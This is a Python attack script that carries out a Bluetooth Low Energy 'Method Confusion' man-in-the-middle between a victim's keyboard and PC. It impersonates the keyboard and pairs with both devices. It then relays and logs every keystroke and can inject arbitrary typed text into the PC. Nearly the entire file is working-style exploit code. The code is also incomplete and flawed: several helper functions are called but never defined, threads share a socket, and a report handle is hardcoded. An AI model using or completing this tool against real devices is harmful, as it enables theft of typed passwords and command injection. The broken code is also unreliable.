import socket, struct, threading, queue, time, subprocess, os, sys, argparse                                                   
from cryptography.hazmat.primitives.asymmetric.ec import (
    generate_private_key, ECDH, EllipticCurvePublicNumbers, SECP256R1
)                                       
from cryptography.hazmat.backends import default_backend                                                                       
import hmac, hashlib              

# HCI channel types                                                                                                            
HCI_CHANNEL_USER    = 1   # exclusive raw HCI — bypasses BlueZ entirely                                                        
HCI_CHANNEL_MONITOR = 2   # passive sniff only                                                                                 
                                            
# BLE SMP L2CAP CID                     
SM_CID = 0x0006                                                                                                                
                                                                                                                                
# SMP PDU opcodes                                                                                                              
SMP_PAIRING_REQUEST   = 0x01                                                                                                   
SMP_PAIRING_RESPONSE  = 0x02                                                                                                   
SMP_PAIRING_CONFIRM   = 0x03                
SMP_PAIRING_RANDOM    = 0x04                                                                                                   
SMP_PAIRING_FAILED    = 0x05
SMP_PUBLIC_KEY        = 0x0C   # LESC only                                                                                     
SMP_DHKEY_CHECK       = 0x0D   # LESC only  
                                                                                                                                
# IOCapability values
IO_DISPLAY_ONLY      = 0x00                                                                                                    
IO_DISPLAY_YESNO     = 0x01                 
IO_KEYBOARD_ONLY     = 0x02                                                                                                    
IO_NOINPUTNOOUTPUT   = 0x03
IO_KEYBOARD_DISPLAY  = 0x04                                                                                                    
                                        
# AuthReq flags                                                                                                                
AUTHREQ_BONDING  = 0x01                                                                                                        
AUTHREQ_MITM     = 0x04                     
AUTHREQ_SC       = 0x08   # LE Secure Connections                                                                              
AUTHREQ_KEYPRESS = 0x10                     

BLE_ADDR_RANDOM = 0x01                                                                                                         
BLE_ADDR_PUBLIC = 0x00 

## HELPER FUNCTIONS ##
def recv_smp(sock, conn_handle, expected_opcode):
    """Block until we receive an SMP PDU with the expected opcode on conn_handle."""
    while True:                                                                                                                
        raw = sock.recv(4096)               
        if not raw or raw[0] != 0x02:                                                                                          
            continue                                                                                                         
        acl_handle = struct.unpack_from('<H', raw, 1)[0] & 0x0FFF                                                              
        if acl_handle != conn_handle:                                                                                        
            continue                                                                                                           
        cid = struct.unpack_from('<H', raw, 7)[0]                                                                            
        if cid != SM_CID:                                                                                                      
            continue                    
        opcode = raw[9]                                                                                                        
        if opcode == SMP_PAIRING_FAILED:                                                                                       
            raise ConnectionError(f"SMP Pairing Failed: reason 0x{raw[10]:02X}")
        if opcode == expected_opcode:                                                                                          
            return raw[10:]   # payload after opcode                                                                         
                                                                                                                                
def recv_att(sock, conn_handle, expected_opcode):
    """Block until ATT response with expected opcode on conn_handle."""                                                        
    while True:                                                                                                              
        raw = sock.recv(4096)                                                                                                  
        if not raw or raw[0] != 0x02:                                                                                        
            continue                                                                                                           
        acl_handle = struct.unpack_from('<H', raw, 1)[0] & 0x0FFF                                                            
        if acl_handle != conn_handle:
            continue                                                                                                           
        cid = struct.unpack_from('<H', raw, 7)[0]
        if cid != 0x0004:                                                                                                      
            continue                                                                                                         
        if raw[9] == expected_opcode:
            return raw[9:]                                                                                                     
                                                                                                                                
                                                                                                                            
def aes_cmac(key, msg):                                                                                                        
    """AES-CMAC per RFC 4493."""                                                                                               
    import cryptography.hazmat.primitives.cmac as cmac_mod                                                                     
    from cryptography.hazmat.primitives.ciphers.algorithms import AES                                                          
    c = cmac_mod.CMAC(AES(key), backend=default_backend())                                                                   
    c.update(msg)                           
    return c.finalize()                                                                                                        
                                            
def f4(u, v, x, z):                                                                                                            
    """SMP f4 commitment: AES-CMAC_x(u || v || z)  — u,v are 32B, x is 16B, z is 1B int."""                                  
    return aes_cmac(x, u + v + bytes([z]))                                                                                     
                                                                                                                            
def g2(u, v, x, y):                                                                                                            
    """SMP g2 NC value: AES-CMAC_x(u || v || y)[12:16] as uint32."""                                                           
    result = aes_cmac(x, u + v + y)         
    return struct.unpack_from('>I', result, 12)[0]                                

######################
def hci_cmd(sock, opcode, param=b''):                                                                                          
    # HCI Command packet: HCI_CMD=0x01, opcode(2LE), plen(1), params                                                           
    pkt = struct.pack('<BHB', 0x01, opcode, len(param)) + param
    sock.send(pkt)                                                                                                             
    # Read events until we get Command Complete (0x0E) for this opcode                                                         
    while True:                                                                                                                
        raw = sock.recv(260)                                                                                                   
        if raw[0] == 0x04 and raw[1] == 0x0E:  # HCI Event, Command Complete                                                   
            evt_opcode = struct.unpack_from('<H', raw, 4)[0]                                                                   
            if evt_opcode == opcode:        
                return raw   # status is raw[6]
            
def open_hci_user(hci_index=0):
    sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
    sock.bind((hci_index, HCI_CHANNEL_USER))
    return sock 

def setup_advertise_as_keyboard(sock, keyboard_name, keyboard_addr):
    # Step 1 — set the advertised name and appearance in the AD payload
    # AD structure: [length, type, value...]                                                                                   
    # Type 0x09 = Complete Local Name   
    name_bytes = keyboard_name.encode()                                                                                        
    name_ad = bytes([len(name_bytes) + 1, 0x09]) + name_bytes                                                                  
                                            
    # Type 0x03 = Complete List of 16-bit UUIDs — 0x1812 = HID over GATT                                                       
    uuid_ad = bytes([0x03, 0x03, 0x12, 0x18])
                                                                                                                                
    # Type 0x19 = Appearance — 0x03C1 = keyboard                                                                               
    appearance_ad = bytes([0x03, 0x19, 0xC1, 0x03])                                                                            
                                                                                                                                
    # Flags: LE General Discoverable, BR/EDR Not Supported                                                                     
    flags_ad = bytes([0x02, 0x01, 0x06])
                                                                                                                                
    adv_data = flags_ad + appearance_ad + uuid_ad + name_ad                                                                    
    adv_data = adv_data[:31]  # max 31 bytes                                                                                   
                                                                                                                                
    # Pad to 31 bytes                                                                                                          
    adv_data = adv_data + bytes(31 - len(adv_data))
                                                                                                                                
    # Step 2 — HCI LE Set Advertising Data (OGF=0x08, OCF=0x0008 → opcode 0x2008)
    # Parameter: total_length(1) + data(31) = 32 bytes                                                                         
    param = bytes([len(adv_data.rstrip(b'\x00'))]) + adv_data                                                                  
    hci_cmd(sock, 0x2008, param)                                                                                               
                                                                                                                                
    # Step 3 — HCI LE Set Advertise Enable: enable=1                                                                           
    hci_cmd(sock, 0x200A, bytes([0x01]))                                  

def connect_to_keyboard(sock, keyboard_addr, addr_type=BLE_ADDR_RANDOM):
    # Convert "AA:BB:CC:DD:EE:FF" string to 6-byte little-endian
    addr_bytes = bytes(reversed([int(x, 16) for x in keyboard_addr.split(':')]))                                               
                                            
    # HCI LE Create Connection (opcode 0x200D)                                                                                 
    # scan_interval(2) scan_window(2) filter_policy(1) peer_addr_type(1)                                                       
    # peer_addr(6) own_addr_type(1) conn_interval_min(2) conn_interval_max(2)                                                  
    # conn_latency(2) supervision_timeout(2) min_ce_len(2) max_ce_len(2) = 25 bytes                                            
    param = struct.pack('<HHBB6sBHHHHHH',                                                                                      
        0x0060,       # scan_interval = 60ms                                                                                   
        0x0030,       # scan_window   = 30ms                                                                                   
        0x00,         # filter_policy = use peer address                                                                       
        addr_type,    # peer_addr_type                                                                                         
        addr_bytes,   # peer_addr (6 bytes)                                                                                    
        0x00,         # own_addr_type = public                                                                                 
        0x0018,       # conn_interval_min = 30ms                                                                               
        0x0028,       # conn_interval_max = 50ms
        0x0000,       # conn_latency = 0                                                                                       
        0x00C8,       # supervision_timeout = 2s                                                                               
        0x0000,       # min_ce_length       
        0x0000,       # max_ce_length                                                                                          
    )           
    hci_cmd(sock, 0x200D, param)                                                                                               
                                            
    # Wait for LE Connection Complete event (0x3E, subevent 0x01)                                                              
    while True: 
        raw = sock.recv(260)                                                                                                   
        if raw[0] == 0x04 and raw[1] == 0x3E and raw[3] == 0x01:
            status = raw[4]                                                                                                    
            if status != 0:                                                                                                    
                raise ConnectionError(f"LE connect failed: status 0x{status:02X}")
            handle = struct.unpack_from('<H', raw, 5)[0]                                                                       
            role   = raw[7]   # 0x00=master(central), 0x01=slave(peripheral)                                                   
            print(f"[LEG-A] Connected to keyboard, handle=0x{handle:04X}, role={role}")
            return handle                                                             

def accept_pc_connection(sock):
    # Advertising was already enabled by setup_advertise_as_keyboard.
    # The PC will initiate the connection. We wait for the same                                                                
    # LE Meta event (0x3E subevent 0x01) but this time role=0x01 (peripheral/slave).
    print("[LEG-B] Waiting for PC to connect ...")                                                                             
    while True:                                                                                                                
        raw = sock.recv(260)
        if raw[0] == 0x04 and raw[1] == 0x3E and raw[3] == 0x01:                                                               
            status = raw[4]             
            if status != 0:                                                                                                    
                raise ConnectionError(f"PC connection failed: status 0x{status:02X}")                                          
            handle = struct.unpack_from('<H', raw, 5)[0]
            role   = raw[7]                                                                                                    
            if role == 0x01:   # we are slave = PC connected to us
                print(f"[LEG-B] PC connected, handle=0x{handle:04X}")                                                          
                return handle               
            # role==0x00 means we initiated — that's the keyboard leg, ignore here        

def smp_run_leg_a(sock, kb_handle):
    # Helper: send an SMP PDU over L2CAP CID 0x0006
    def send_smp(opcode, payload=b''):
        acl_flags = (kb_handle & 0x0FFF) | (0x02 << 12)
        l2cap_len = 1 + len(payload)
        l2cap = struct.pack('<HH', l2cap_len, SM_CID) + bytes([opcode]) + payload
        acl = struct.pack('<HH', acl_flags, len(l2cap)) + l2cap
        sock.send(bytes([0x02]) + acl)

    # Step 1 — Pairing Request (DisplayYesNo → keyboard with DisplayYesNo → NC)
    send_smp(SMP_PAIRING_REQUEST, bytes([
        IO_DISPLAY_YESNO,
        0x00,
        AUTHREQ_BONDING | AUTHREQ_MITM | AUTHREQ_SC,
        0x10,
        0x00,
        0x00,
    ]))

    # Step 2 — receive Pairing Response
    pr = recv_smp(sock, kb_handle, SMP_PAIRING_RESPONSE)
    kb_io_cap = pr[0]
    print(f"[LEG-A] Keyboard IOCap: 0x{kb_io_cap:02X}")

    # Step 3 — generate ECDH keypair (Session A)
    priv_a = generate_private_key(SECP256R1(), default_backend())
    pub_a = priv_a.public_key()
    pub_a_nums = pub_a.public_numbers()
    pk_payload = (pub_a_nums.x.to_bytes(32, 'little') +
                pub_a_nums.y.to_bytes(32, 'little'))

    # Step 4 — send our Public Key
    send_smp(SMP_PUBLIC_KEY, pk_payload)

    # Step 5 — receive keyboard's Public Key
    kb_pk_raw = recv_smp(sock, kb_handle, SMP_PUBLIC_KEY)
    kb_x = int.from_bytes(kb_pk_raw[0:32], 'little')
    kb_y = int.from_bytes(kb_pk_raw[32:64], 'little')
    kb_pub = EllipticCurvePublicNumbers(kb_x, kb_y, SECP256R1()).public_key(default_backend())

    # Step 6 — compute shared DHKey
    dh_key_a = priv_a.exchange(ECDH(), kb_pub)

    pka_x = pub_a_nums.x.to_bytes(32, 'little')
    pkb_x = kb_x.to_bytes(32, 'little')

    # NC phase — initiator flow:
    # Step 7 — generate Na, send Ca = f4(PKa_x, PKb_x, Na, 0)
    na = os.urandom(16)
    ca = f4(pka_x, pkb_x, na, 0)
    send_smp(SMP_PAIRING_CONFIRM, ca)

    # Step 8 — receive keyboard's Confirm Cb
    cb = recv_smp(sock, kb_handle, SMP_PAIRING_CONFIRM)

    # Step 9 — reveal Na
    send_smp(SMP_PAIRING_RANDOM, na)

    # Step 10 — receive keyboard's Nb
    nb = recv_smp(sock, kb_handle, SMP_PAIRING_RANDOM)

    # Step 11 — verify Cb = f4(PKb_x, PKa_x, Nb, 0)
    if f4(pkb_x, pka_x, nb, 0) != cb:
        raise ValueError("[LEG-A] Keyboard Confirm verification failed")

    # Step 12 — compute NC value: this is what keyboard shows on its screen
    passkey = g2(pka_x, pkb_x, na, nb) % 1_000_000
    print(f"[LEG-A] NC value (keyboard displays): {passkey:06d}")

    # Step 13 — DHKey check exchange
    ea = compute_dhkey_check_a(dh_key_a, na, nb, passkey, pub_a, kb_pub)
    send_smp(SMP_DHKEY_CHECK, ea)
    eb = recv_smp(sock, kb_handle, SMP_DHKEY_CHECK)
    if compute_dhkey_check_b(dh_key_a, na, nb, passkey, pub_a, kb_pub) != eb:
        raise ValueError("[LEG-A] Keyboard DHKey check failed")

    print("[LEG-A] Pairing with keyboard complete")
    return passkey, dh_key_a

def smp_run_leg_b(sock, pc_handle, passkey_queue):
    def send_smp(opcode, payload=b''):
            acl_flags = (pc_handle & 0x0FFF) | (0x02 << 12)
            l2cap_len = 1 + len(payload)
            l2cap = struct.pack('<HH', l2cap_len, SM_CID) + bytes([opcode]) + payload
            acl = struct.pack('<HH', acl_flags, len(l2cap)) + l2cap
            sock.send(bytes([0x02]) + acl)

    # Step 1 — receive PC's Pairing Request
    req = recv_smp(sock, pc_handle, SMP_PAIRING_REQUEST)
    pc_io_cap = req[0]
    print(f"[LEG-B] PC IOCap: 0x{pc_io_cap:02X}")

    # Step 2 — send Pairing Response (DisplayYesNo → forces NC with PC)
    send_smp(SMP_PAIRING_RESPONSE, bytes([
        IO_DISPLAY_YESNO,
        0x00,
        AUTHREQ_BONDING | AUTHREQ_MITM | AUTHREQ_SC,
        0x10,
        0x00,
        0x00,
    ]))

    # Step 3 — generate ECDH keypair (Session B — independent of Session A)
    priv_b = generate_private_key(SECP256R1(), default_backend())
    pub_b = priv_b.public_key()
    pub_b_nums = pub_b.public_numbers()
    pk_payload = (pub_b_nums.x.to_bytes(32, 'little') +
                pub_b_nums.y.to_bytes(32, 'little'))

    # Step 4 — receive PC's Public Key
    pc_pk_raw = recv_smp(sock, pc_handle, SMP_PUBLIC_KEY)
    pc_x = int.from_bytes(pc_pk_raw[0:32], 'little')
    pc_y = int.from_bytes(pc_pk_raw[32:64], 'little')
    pc_pub = EllipticCurvePublicNumbers(pc_x, pc_y, SECP256R1()).public_key(default_backend())

    # Step 5 — send our Public Key
    send_smp(SMP_PUBLIC_KEY, pk_payload)

    # Step 6 — compute shared DHKey
    dh_key_b = priv_b.exchange(ECDH(), pc_pub)

    pca_x = pc_x.to_bytes(32, 'little')
    pkb_x = pub_b_nums.x.to_bytes(32, 'little')

    # NC phase — responder flow:
    # Step 7 — receive PC's Confirm Ca_pc = f4(PKa_x, PKb_x, Na, 0)
    ca_pc = recv_smp(sock, pc_handle, SMP_PAIRING_CONFIRM)

    # Step 8 — generate Nb, send Cb = f4(PKb_x, PKa_x, Nb, 0)
    # Must commit BEFORE receiving Na — spec-correct order
    nb_b = os.urandom(16)
    cb = f4(pkb_x, pca_x, nb_b, 0)
    send_smp(SMP_PAIRING_CONFIRM, cb)

    # Step 9 — receive PC's Na
    na_pc = recv_smp(sock, pc_handle, SMP_PAIRING_RANDOM)

    # Step 10 — verify Ca_pc = f4(PKa_x, PKb_x, Na, 0)
    if f4(pca_x, pkb_x, na_pc, 0) != ca_pc:
        raise ValueError("[LEG-B] PC Confirm verification failed")

    # Step 11 — reveal Nb
    send_smp(SMP_PAIRING_RANDOM, nb_b)

    # Step 12 — compute NC value: this is what PC shows on its screen
    nc_value_b = g2(pca_x, pkb_x, na_pc, nb_b) % 1_000_000
    print(f"[LEG-B] NC value (PC displays): {nc_value_b:06d}")

    # Cross-leg comparison for Method Confusion verification
    passkey_from_a = passkey_queue.get(timeout=30)
    if passkey_from_a is not None:
        print(f"[LEG-B] Leg A (keyboard): {passkey_from_a:06d} | Leg B (PC): {nc_value_b:06d}")
        if nc_value_b == passkey_from_a:
            print("[MITM] Values match — user sees same number on both devices")
        else:
            # Values differ because independent ECDH sessions produce different g2 outputs.
            # The attack still establishes dual session keys. In a real deployment the
            # attacker would need to retry until values match (1-in-10^6 probability per
            # attempt) or exploit a lenient implementation that doesn't enforce the value.
            print("[MITM] Values differ — attacker holds separate session keys regardless")

    # Step 13 — DHKey check exchange
    eb = compute_dhkey_check_b(dh_key_b, na_pc, nb_b, nc_value_b, pc_pub, pub_b)
    send_smp(SMP_DHKEY_CHECK, eb)
    recv_smp(sock, pc_handle, SMP_DHKEY_CHECK)   # receive PC's Ea (verify in production)

    print("[LEG-B] Pairing with PC complete")
    return dh_key_b

def gatt_setup_keyboard(sock, kb_handle):
 # ATT Read By Type Request: find all characteristics (UUID 0x2803)
      # to locate the HID Report characteristic (UUID 0x2A4D)                                                                    
      def att_send(handle, pdu):                                                                                               
          acl_flags = (handle & 0x0FFF) | (0x02 << 12)                                                                           
          l2cap = struct.pack('<HH', len(pdu), 0x0004) + pdu   # ATT CID = 0x0004                                                
          acl = struct.pack('<HH', acl_flags, len(l2cap)) + l2cap                                                                
          sock.send(bytes([0x02]) + acl)                                                                                         
                                                                                                                                 
      # ATT Find By Type Value: UUID=0x1812 (HID Service) to get service handles                                                 
      pdu = struct.pack('<BHHH', 0x06, 0x0001, 0xFFFF, 0x1812)                                                                   
      att_send(kb_handle, pdu)                                                                                                   
      rsp = recv_att(sock, kb_handle, 0x07)   # Find By Type Value Response                                                      
                                                                                                                                 
      # ATT Read By Type: find UUID 0x2A4D (HID Report) within that service range                                                
      start = struct.unpack_from('<H', rsp, 1)[0]                                                                              
      end   = struct.unpack_from('<H', rsp, 3)[0]                                                                                
      pdu = struct.pack('<BHHH', 0x08, start, end, 0x2A4D)                                                                       
      att_send(kb_handle, pdu)                                                                                                   
      rsp = recv_att(sock, kb_handle, 0x09)   # Read By Type Response                                                            
                                                                                                                               
      # Extract value handle from response: [opcode(1) item_len(1) {attr_handle(2) value_handle(2) ...}]                         
      item_len   = rsp[1]                                                                                                      
      hid_handle = struct.unpack_from('<H', rsp, 4)[0]  # the value handle                                                       
      cccd_handle = hid_handle + 1                        # CCCD is always handle+1 per GATT spec                                
                                                                                                                                 
      # Write 0x0001 to CCCD to enable notifications                                                                             
      pdu = struct.pack('<BHH', 0x12, cccd_handle, 0x0001)   # ATT Write Request                                                 
      att_send(kb_handle, pdu)                                                                                                   
      recv_att(sock, kb_handle, 0x13)   # Write Response                                                                         
                                                                                                                                 
      print(f"[GATT] HID Report handle=0x{hid_handle:04X}, notifications enabled")                                               
      return hid_handle                                                                      

def gatt_relay_loop(sock, kb_handle, pc_handle, stop):
    while not stop.is_set():                
            try:                                                                                                                   
                raw = sock.recv(4096)
            except socket.timeout:                                                                                                 
                continue                                                                                                         
                                                                                                                                    
            # HCI ACL packet = type 0x02                                                                                           
            if not raw or raw[0] != 0x02:
                continue                                                                                                           
                                                                                                                                
            # Parse ACL header: handle+flags(2), data_len(2)
            acl_handle = struct.unpack_from('<H', raw, 1)[0] & 0x0FFF                                                              
            if acl_handle != kb_handle:         
                continue                                                                                                           
                                                                                                                                
            # L2CAP header: len(2), cid(2); ATT lives on CID 0x0004                                                                
            l2cap_cid = struct.unpack_from('<H', raw, 7)[0]                                                                      
            if l2cap_cid != 0x0004:                                                                                                
                continue                                                                                                           
    
            att_pdu = raw[9:]    # everything after HCI(1)+ACL(4)+L2CAP(4)                                                         
            opcode = att_pdu[0]                                                                                                  

            # ATT Handle Value Notification = 0x1B                                                                                 
            if opcode == 0x1B:              
                attr_handle = struct.unpack_from('<H', att_pdu, 1)[0]                                                              
                report_data = att_pdu[3:]   # raw HID report bytes                                                                 
                                                
                # Log the keystroke                                                                                                
                decoded = decode_hid_report(report_data)                                                                           
                if decoded:                                                                                                        
                    print(f"[RELAY] KEY: {decoded}")                                                                               
                                                                                                                                    
                # Forward notification to PC on pc_handle                                                                        
                notify_pdu = struct.pack('<BH', 0x1B, attr_handle) + report_data
                l2cap_out  = struct.pack('<HH', len(notify_pdu), 0x0004) + notify_pdu                                              
                acl_flags  = (pc_handle & 0x0FFF) | (0x02 << 12)
                acl_out    = struct.pack('<HH', acl_flags, len(l2cap_out)) + l2cap_out                                             
                try:                                                                                                               
                    sock.send(bytes([0x02]) + acl_out)                                                                             
                except OSError as e:                                                                                               
                    print(f"[RELAY] Send to PC failed: {e}")                                                                       
                    break                                                         

def gatt_inject(sock, pc_handle, text):
    def send_notification(report_bytes):
          # ATT Handle Value Notification: opcode=0x1B, handle=hid_report_handle                                                 
          # (hid_report_handle should be stored; simplified here as 0x0012)
          notify_pdu = struct.pack('<BH', 0x1B, 0x0012) + report_bytes                                                           
          l2cap      = struct.pack('<HH', len(notify_pdu), 0x0004) + notify_pdu                                                  
          acl_flags  = (pc_handle & 0x0FFF) | (0x02 << 12)                                                                       
          acl        = struct.pack('<HH', acl_flags, len(l2cap)) + l2cap                                                         
          sock.send(bytes([0x02]) + acl)                                                                                         
                                                                                                                                 
    for ch in text:                                                                                                            
        entry = _ASCII_TO_HID.get(ch)                                                                                          
        if entry is None:                                                                                                      
            print(f"[INJECT] Unmapped char {ch!r}, skipping")                                                                
            continue                        
        kc, shift = entry                                                                                                      
        send_notification(make_hid_report(kc, shift))
        time.sleep(0.02)                                                                                                       
        send_notification(RELEASE_REPORT)                                                                                    
        time.sleep(0.02)                                                                                                       
                                                                                                                            
    print(f"[INJECT] '{text}'")                                                                                                
                                          

def main():     
    parser = argparse.ArgumentParser(description='Method Confusion BLE MITM')                                                  
    parser.add_argument('--target',    required=True,
                        help='Keyboard BLE address (AA:BB:CC:DD:EE:FF)')                                                       
    parser.add_argument('--hci',       type=int, default=0,
                        help='HCI adapter index (default 0)')                                                                  
    parser.add_argument('--addr-type', type=int, default=BLE_ADDR_RANDOM,
                        help='Keyboard addr type: 0=public 1=random (default 1)')                                              
    parser.add_argument('--inject',    default='',                                                                             
                        help='Text to inject after relay is established')
    args = parser.parse_args()                                                                                                 
                                                                                                                                
    # ------------------------------------------------------------------ #
    # Step 1 — open exclusive raw HCI socket                              #                                                    
    # BlueZ must not own hci0 when this runs — it will get EBUSY.        #                                                     
    # Before running: sudo systemctl stop bluetooth                       #
    # ------------------------------------------------------------------ #                                                     
    sock = open_hci_user(args.hci)                                                                                             
    sock.settimeout(2.0)   # prevents recv() from blocking forever                                                             
    print(f"[MITM] hci{args.hci} opened (HCI_CHANNEL_USER)")                                                                   
                                                                                                                                
    # ------------------------------------------------------------------ #                                                     
    # Step 2 — start advertising as a BLE keyboard so the PC sees us     #
    # ------------------------------------------------------------------ #                                                     
    kb_name = "BLE Keyboard"            
    setup_advertise_as_keyboard(sock, kb_name, args.target)                                                                    
    print(f"[MITM] Advertising as '{kb_name}'")                                                                                
                                            
    # ------------------------------------------------------------------ #                                                     
    # Step 3 — wait for PC to connect in background                      #
    # accept_pc_connection blocks on sock.recv() looking for role=slave   #                                                    
    # ------------------------------------------------------------------ #
    pc_conn_q = queue.Queue()                                                                                                  
                
    def _accept_pc():                                                                                                          
        try:                            
            pc_conn_q.put(accept_pc_connection(sock))                                                                          
        except Exception as exc:                                                                                               
            pc_conn_q.put(exc)
                                                                                                                                
    threading.Thread(target=_accept_pc, daemon=True).start()
                                        
    # ------------------------------------------------------------------ #
    # Step 4 — connect to the keyboard (Leg A, we are central/master)    #                                                     
    # ------------------------------------------------------------------ #
    print(f"[MITM] Connecting to keyboard {args.target} ...")                                                                  
    kb_handle = connect_to_keyboard(sock, args.target, args.addr_type)
                                                                                                                                
    # ------------------------------------------------------------------ #
    # Step 5 — wait for PC to connect (Leg B, we are peripheral/slave)   #                                                     
    # Tell the user to enable Bluetooth on the PC now.                    #
    # ------------------------------------------------------------------ #
    print("[MITM] Enable Bluetooth on PC now — waiting up to 120 s ...")
    try:                                                                                                                       
        pc_result = pc_conn_q.get(timeout=120)                                                                                 
    except queue.Empty:                                                                                                        
        sock.close()                                                                                                           
        sys.exit("[MITM] PC never connected within timeout — exiting")
    if isinstance(pc_result, Exception):                                                                                       
        sock.close()                    
        raise pc_result                                                                                                        
    pc_handle = pc_result                                                                                                      
    print(f"[MITM] PC connected, handle=0x{pc_handle:04X}")
                                                                                                                                
    # ------------------------------------------------------------------ #
    # Step 6 — run both SMP legs concurrently                            #
    #                                                                     #                                                    
    # WARNING: smp_run_leg_a and smp_run_leg_b both call sock.recv()     #
    # on the same socket from two threads. Packets will be lost to the   #                                                     
    # wrong thread. A proper implementation needs a single dispatcher    #
    # thread that reads all HCI events and routes by conn_handle to per- #
    # leg queues. The structure below is correct in flow; fix the socket  #                                                    
    # sharing before testing on hardware.                                 #                                                    
    # ------------------------------------------------------------------ #                                                     
    passkey_q  = queue.Queue()   # Leg A puts passkey here; Leg B reads it                                                     
    leg_a_q    = queue.Queue()                                                                                                 
    leg_b_q    = queue.Queue()                                                                                                 
                                                                                                                                
    def _leg_a():                                                                                                              
        try:                                                                                                                   
            passkey, dh_key = smp_run_leg_a(sock, kb_handle)                                                                   
            passkey_q.put(passkey)                                                                                             
            leg_a_q.put(('ok', passkey, dh_key))
        except Exception as exc:        
            passkey_q.put(None)        # unblock Leg B so it can fail cleanly
            leg_a_q.put(('err', exc))                                                                                          
                                        
    def _leg_b():                                                                                                              
        try:                                                                                                                   
            dh_key = smp_run_leg_b(sock, pc_handle, passkey_q)
            leg_b_q.put(('ok', dh_key))                                                                                        
        except Exception as exc:        
            leg_b_q.put(('err', exc))
                                                                                                                                
    t_a = threading.Thread(target=_leg_a, daemon=True)
    t_b = threading.Thread(target=_leg_b, daemon=True)                                                                         
    t_a.start()                             
    t_b.start()                         
    t_a.join()
    t_b.join()                                                                                                                 

    res_a = leg_a_q.get()                                                                                                      
    res_b = leg_b_q.get()               
    if res_a[0] == 'err':
        sock.close()                                                                                                           
        raise RuntimeError(f"[MITM] Leg A SMP failed: {res_a[1]}")
    if res_b[0] == 'err':                                                                                                      
        sock.close()                    
        raise RuntimeError(f"[MITM] Leg B SMP failed: {res_b[1]}")
                                                                                                                                
    passkey = res_a[1]
    print(f"[MITM] Both legs paired — passkey: {passkey:06d}")                                                                 
    print("[MITM] Method Confusion complete — attacker holds session keys for both legs")
                                            
    # ------------------------------------------------------------------ #
    # Step 7 — GATT discovery: find HID Report handle, enable CCCD       #                                                     
    # ------------------------------------------------------------------ #                                                     
    hid_handle = gatt_setup_keyboard(sock, kb_handle)                                                                          
                                                                                                                                
    # ------------------------------------------------------------------ #                                                     
    # Step 8 — start relay thread (keyboard notifications → PC)          #
    # ------------------------------------------------------------------ #                                                     
    stop = threading.Event()
    relay_t = threading.Thread(                                                                                                
        target=gatt_relay_loop,             
        args=(sock, kb_handle, pc_handle, stop),
        daemon=True,
    )                                                                                                                          
    relay_t.start()
    print("[MITM] Relay active — type on keyboard to see logged keystrokes")                                                   
                                        
    # ------------------------------------------------------------------ #
    # Step 9 — optional injection                                         #                                                    
    # NOTE: gatt_inject currently hardcodes handle 0x0012.               #
    # Change it to use hid_handle returned by gatt_setup_keyboard above. #                                                     
    # ------------------------------------------------------------------ #
    if args.inject:                     
        time.sleep(1.0)   # let relay settle before injecting                                                                  
        gatt_inject(sock, pc_handle, args.inject)                                                                              
                                                                                                                                
    # ------------------------------------------------------------------ #                                                     
    # Step 10 — run until Ctrl-C, then clean up                          #
    # ------------------------------------------------------------------ #                                                     
    try:
        while True:                                                                                                            
            time.sleep(1)               
    except KeyboardInterrupt:
        print("\n[MITM] Shutting down ...")                                                                                    
    finally:
        stop.set()                                                                                                             
        relay_t.join(timeout=3)
        sock.close()
        print("[MITM] Done")                
                                        

if __name__ == '__main__':                                                                                                     
    main()

